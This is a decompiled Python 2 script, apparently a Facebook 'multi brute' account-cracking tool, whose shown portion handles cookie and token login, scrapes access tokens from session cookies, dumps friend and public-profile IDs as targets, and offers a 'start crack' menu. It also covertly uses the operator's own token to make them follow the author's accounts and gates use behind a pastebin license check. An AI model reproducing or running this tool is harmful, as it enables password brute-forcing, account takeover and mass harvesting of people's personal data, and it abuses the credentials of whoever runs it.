#!/usr/bin/python2
# coding=utf-8
# decompile by Itsuki ft. Aap Afandi ID
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )
import requests, bs4, sys, os, uuid, subprocess, sys, random, time, re, base64, json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
os.system('clear')
animasi = ["[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]"]
for i in range(len(animasi)):
    time.sleep(0.0050)
    sys.stdout.write("\r\x1b[0;92m loading \x1b[0;96m: "+ random.choice(['\x1b[0;93m', '\x1b[0;96m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;95m']) + animasi[i % len(animasi)])
    sys.stdout.flush()
os.system("clear")
 ### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def negara():
    try:
        b=requests.get("https://api.ipify.org").text.strip()
        ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
        if "Pakistan" in ips:
            notice()
        else:
            print "\n\n %s[%s!%s] This Script Is Not Available In Your Country"%(N,M,N)
            print " [%s!%s] This Script Only Available In Pakistan\n\n"%(M,N)
            exit()
    except:
        ips=None
        exit()
    uas=None
    if os.path.exists(".browser"):
        if os.path.getsize(".browser") !=0:
            uas=open(".browser").read().strip()

def tik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for o in titik:
        print '\r %s[%s+%s] Please wait %s'%(P,O,P,o),
        sys.stdout.flush()
        time.sleep(1)
def tok():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for y in titik:
        print '\r %s[%s*%s] Checking key %s'%(P,O,P,y),
        sys.stdout.flush()
        time.sleep(1)
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s×%s] Delete token %s'%(P,M,P,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
logo ='''%s  __  __ _   _ _  _____ ___    ___ __  __ ___ ___ 
 |  \/  | | | | ||_   _|_ _|  / __|  \/  | _ ) __| ®
 | |\/| | |_| | |__| |  | |  | (__| |\/| | _ \ _| 
 |_|  |_|\___/|____|_| |___|  \___|_|  |_|___/_|  
                                                  
 [*] ----------------------------------------------
 [*] Author      : YayanXD
 [*] Gitbub      : https://github.com/Yayan-XD
 [*] Facebook    : https://www.facebook.com/KM39453
 [*] ----------------------------------------------
 [*] IP          : %s%s
'''%(P,H,IP)
logo2 ='''%s    __  _____  ____ __________  _______  ______  ____
   /  |/  / / / / //_  __/  _/ / ___/  |/  / _ )/ __/ ®
  / /|_/ / /_/ / /__/ / _/ /  / /__/ /|_/ / _  / _/  
 /_/  /_/\____/____/_/ /___/  \___/_/  /_/____/_/    
 
          %s *%s CROOT MULTI BRUTE FACEBOOK %s*
%s--------------------------------------------------
'''%(P,O,H,O,P)
logo3 ='''%s  __  __ _   _ _  _____ ___    ___ __  __ ___ ___ 
 |  \/  | | | | ||_   _|_ _|  / __|  \/  | _ ) __| ®
 | |\/| | |_| | |__| |  | |  | (__| |\/| | _ \ _| 
 |_|  |_|\___/|____|_| |___|  \___|_|  |_|___/_|  
                                                  
 [*] ----------------------------------------------
 [*] Author      : YayanXD
 [*] Gitbub      : https://github.com/Yayan-XD
 [*] Facebook    : https://www.facebook.com/KM39453
 [*] ----------------------------------------------
'''%(P)
host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
		
def bocah_kontol():
	try:
		toket = open('license.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n %s[%s!%s] License Invalid"%(P,M,P)
		os.system('clear')
		os.system('rm -rf license.txt')
		berhasil()
	if os.path.exists('license.txt'):
		gagal()
	else:
		berhasil()
		
def berhasil():
    os.system('clear')
    print logo3
    print 51 * '-'
    tok()
    id = uuid.uuid4().hex[:20]
    idg = open('license.txt', 'w')
    idg.write(id)
    idg.close()
    jalan( '\n %s[%s•%s] Your Api Key : %s%s'%(P,B,P,H,id))
    time.sleep(2)
    print ' %s[%s•%s] Api key has not been confirmed'%(P,K,P)
    time.sleep(2)
    print ' %s[%s*%s] Press enter to confirm api key'%(P,U,P)
    raw_input('\n   %s[%s ENTER %s]%s '%(B,K,B,N))
    os.system('am start https://wa.me/'+requests.get('https://raw.githubusercontent.com/Yayan-XD/cmbf/main/img/kimochi.txt').text.strip()+'?text=Hi,+YayanXD,+please+confirm+my+api+key+code+:%20' + id + ' >/dev/null')
    exit()
    
#https://pastebin.com/uRKDbBk4
def gagal():
    try:
        mmk = open('license.txt', 'r').read()
        plr = requests.get('https://pastebin.com/raw/uRKDbBk4').text
        if mmk in plr:
            os.system("clear")
            print logo3
            print 51 * '-'
            tok()
            jalan('\n %s[%s✓%s]%s Login Successful'%(P,H,P,H))
            time.sleep(2)
            moch_yayan()    
        else:
            os.system("clear")
            print logo3
            print 51 * '-'
            tok()
            print '\n %s[%s×%s] Login status %sFailed'%(P,M,P,M)
            time.sleep(2)
            print ' %s[%s!%s] Api key has not been confirmed'%(P,M,P)
            time.sleep(2)
            print ' %s[%s*%s] Press enter to confirm api key'%(P,U,P)
            raw_input('\n   %s[%s ENTER %s]%s '%(B,K,B,N))
            os.system('am start https://wa.me/'+requests.get('https://raw.githubusercontent.com/Yayan-XD/cmbf/main/img/kimochi.txt').text.strip()+'?text=Hi,+YayanXD,+please+confirm+my+api+key+code+:%20' + mmk + ' >/dev/null')
            exit()
    except requests.exceptions.ConnectionError:
        print '\n %s[%s!%s] no connection'%(P,M,P)
        raw_input(' %s[ %sBACK%s ] '%(P,O,P))
        exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'license.txt'])
        berhasil()

def yayanxd():
    os.system('clear')
    print logo2 
    print '\n %s[%s1%s] Login Cookis Facebook'%(P,O,P)
    print ' %s[%s2%s] Login Token Facebook'%(P,O,P)
    pilih()

def pilih():
    m = raw_input('\n [*] choose : ')
    if m == '':
        print '\n %s[%s!%s] Wrong Input'%(P,M,P)
        time.sleep(1)
        os.system('clear')
        yayanxd()
    elif m == '1':
        cokis()
    elif m == '2':
        token()
    else:
        print '\n %s[%s!%s] Wrong Input'%(P,M,P)
        time.sleep(1)
        os.system('clear')
        yayanxd()

def cokis():
    try:
    	print logo
        cookie = raw_input("\n %s[%s?%s] cookies :%s "%(P,M,P,H))
        tik()
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        cari = re.search('(EAAA\\w+)', coki.text)
        hasil = cari.group(1)
        zedd = open('login.txt', 'w')
        zedd.write(hasil)
        zedd.close()
        jalan('\n\n %s[%s✓%s] Login successful'%(P,H,P))
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        cindy()
    except KeyError:
        print "\n\n %s[%s!%s] cookies invalid"%(P,M,P)
        os.system('xdg-open https://youtu.be/DF7bUCn0GFY')
        time.sleep(2)
        yayanxd()
		
def token():
	os.system('clear')
	print logo2
	toket = raw_input("\n %s[%s?%s] Token :%s "%(P,M,P,H))
	tik()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan('\n\n %s[%s✓%s] Login successful'%(P,H,P))
		time.sleep(1)
		os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
		cindy()
	except KeyError:
		print "\n\n %s[%s!%s] token invalid"%(P,M,P)
		time.sleep(2)
		#os.system('xdg-open https://youtu.be/g2vu13R8_qY')
		yayanxd()

def cindy():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
        yayanxd()
    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100013707817941/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100045203855294/subscribers?access_token=' + toket)
    moch_yayan()
### ORANG GANTENG ###
def moch_yayan():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
		time.sleep(3)
		os.system('rm -rf login.txt')
		os.system('clear')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
		os.system('rm -rf login.txt')
		os.system('clear')
		yayanxd()
	except requests.exceptions.ConnectionError:
		print " %s[%s!%s] no connection"%(P,M,P)
		exit()
        os.system("clear")
        print logo
        print " %s[ Welcome %s%s%s ]\n"%(P,K,nama,P)
        print " [1]. Dump id from friends"
        print " [2]. Dump id from public friends"
        print " [3]. Dump id from total followers"
        print " [4]. Dump id from like post"
        print " [5]. Start crack"
        print " [6]. Check results"
        print " [0]. out(%sdelet token%s)"%(M,P)
        pilih_kontol()

def pilih_kontol():
        yan = raw_input("\n [*] menu : ")
        if yan == '':
           print '\n %s[%s!%s] Wrong Input'%(P,M,P)
           time.sleep(1)
           os.system('clear')
           moch_yayan()
        elif yan =="1":
                teman()
        elif yan =="2":
                publik()
        elif yan =="3":
                followers()
        elif yan =="4":
                postingan()
        elif yan =="5":
                method()
        elif yan =="6":
        	    results()
        elif yan =="0":
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf login.txt')
                jalan ('\n %s[%s✓%s]%s successful delete token'%(P,H,P,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s!%s] Wrong Input'%(P,M,P)
            time.sleep(1)
            os.system('clear')
            moch_yayan()

def method():
    print '\n [ please choose one ]\n'
    print ' [1]. method api (fast crack)'
    print ' [2]. method mbasic (slow crack)\n'
    pilih_method()

def pilih_method():
    xd = raw_input(' [*] choose : ')
    if xd == '':
        print '\n %s[%s!%s] Wrong Input'%(P,M,P)
        time.sleep(1)
        pilih_method()
    elif xd == '1':
        crack_b_api()
    elif xd == '2':
        crack_mbasic()
    else:
        print '\n %s[%s!%s] Wrong Input'%(P,M,P)
        time.sleep(1)
        pilih_method()

def notice():
    print '\n SUBSCRIBE ME PLEASE'
    time.sleep(2)
    os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
    bocah_kontol()

## CEK HASIL ##
def results():
    print '\n'
    jalan(' %s*%s notice: type ls if there is a first name cp/ok'%(O,P))
    time.sleep(2)
    jalan(' %s*%s example: cp-17-April-2021.txt or ok-17-April-2021.txt'%(O,P))
    time.sleep(2)
    jalan(' %s*%s type nano cp-17-April-2021.txt then press enter '%(O,P))
    time.sleep(2)
    jalan(' %s*%s do you understand? '%(O,P))
    time.sleep(2)
    jalan(" %s*%s type N to view the video, type Y to continue"%(O,P))
    time.sleep(2)
    kentod()
def kentod():
    pler = raw_input('\n [*] choose [y/n] : ')
    if pler == '':
        print '\n %s[%s!%s] bisa baca gak goblok'%(P,M,P)
        time.sleep(1)
        kentod()
    elif pler == 'n' or pler == 'N':
        os.system('xdg-open https://pixeldrain.com/u/oAgVoYVS')
    elif pler == 'y' or pler == 'Y':
        exit()
    else:
        print '\n %s[%s!%s] bisa baca gak goblok'%(P,M,P)
        time.sleep(1)
        kentod()
   
def teman():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        mmk = raw_input('\n [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=' + asw + '&access_token=' + toket)
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] total dump : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] successful dump id from friends'%(P,H,P))
        print ' [%s•%s]%s copy output file 👉%s ( %s%s%s )'%(B,P,H,P,M,cin,P)
        print 50 * '-'
        raw_input('%s [%s ENTER%s ]'%(K,O,K))
        moch_yayan()
    except Exception as e:
        exit('\n %s[%s!%s] Failed dump id'%(P,M,P))

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print "\n %s[%s!%s] token/cookies invalid"%(P,M,P)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        idt = raw_input('\n [?] id public  : ')
        mmk = raw_input(' [?] name file  : ')
        asw = raw_input(' [?] limit id   : ')
        xxx = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=' + asw + '&access_token=' + toket)
        id = []
        z = json.loads(xxx.text)
        ppk = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ppk, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
